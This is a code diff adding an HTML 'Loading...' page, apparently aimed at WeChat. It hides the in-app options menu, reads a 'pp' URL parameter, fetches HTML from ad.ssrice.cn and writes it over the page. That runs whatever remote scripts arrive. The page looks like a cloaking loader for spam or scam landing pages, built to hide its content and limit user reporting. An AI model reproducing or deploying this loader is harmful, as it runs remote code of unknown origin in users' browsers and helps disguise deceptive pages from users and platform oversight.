@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<script>
+document.addEventListener('WeixinJSBridgeReady',function onBridgeReady(){
+    WeixinJSBridge.call('hideOptionMenu');
+})
+</script>
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<title>加载中...</title>
+
+</head>
+<body>
+
+<script type="text/javascript">
+function loadhtml(url){
+	document.title = "...";
+    var xhr = new XMLHttpRequest;
+    var html = null;
+    function render() {
+        var a = document.open("text/html", "replace");
+        a.write(html);
+        a.close();
+    }
+    xhr.onload = function() {
+        html = xhr.responseText;
+        var delay = 0;
+        if (delay > 0) setTimeout("render()", delay * 1000)
+        else render();
+    };
+    xhr.open("GET",url, !0);
+    xhr.send();
+}
+
+function GetQueryString(name)
+{
+	 var reg = new RegExp("(^|&)"+ name +"=([^&]*)(&|$)");
+	 var r = window.location.search.substr(1).match(reg);
+	 if(r!=null)
+		return  unescape(r[2]);
+	  return null;
+}
+
+function GetRequest(urlStr) {
+    if (typeof urlStr == "undefined") {
+        var url = decodeURI(location.search); //获取url中"?"符后的字符串
+    } else {
+        var url = "?" + urlStr.split("?")[1];
+    }
+    var theRequest = new Object();
+    if (url.indexOf("?") != -1) {
+        var str = url.substr(1);
+        strs = str.split("&");
+        for (var i = 0; i < strs.length; i++) {
+            theRequest[strs[i].split("=")[0]] = decodeURI(strs[i].split("=")[1]);
+        }
+    }
+    return theRequest;
+}
+
+//判断字符是否为空的方法
+function isEmpty(obj){
+	if(typeof obj == "undefined" || obj == null || obj == ""){
+		return true;
+	}else{
+		return false;
+	}
+}
+
+function randomString(length) {
+    var str = "abcdefghijklmnopqrstuvwxyz";
+    var result = "";
+    for (var i = length; i > 0; --i) 
+    result += str[Math.floor(Math.random() * str.length)];
+    return result;
+}
+
+var suiji = randomString(8);
+var urlid = GetRequest();
+urlid = urlid.pp;
+if(urlid.indexOf("?d") != -1){
+	urlid = urlid.replace("?d","");
+}
+
+loadhtml("//ad.ssrice.cn/s/"+urlid);
+</script>
+</body>
+</html>
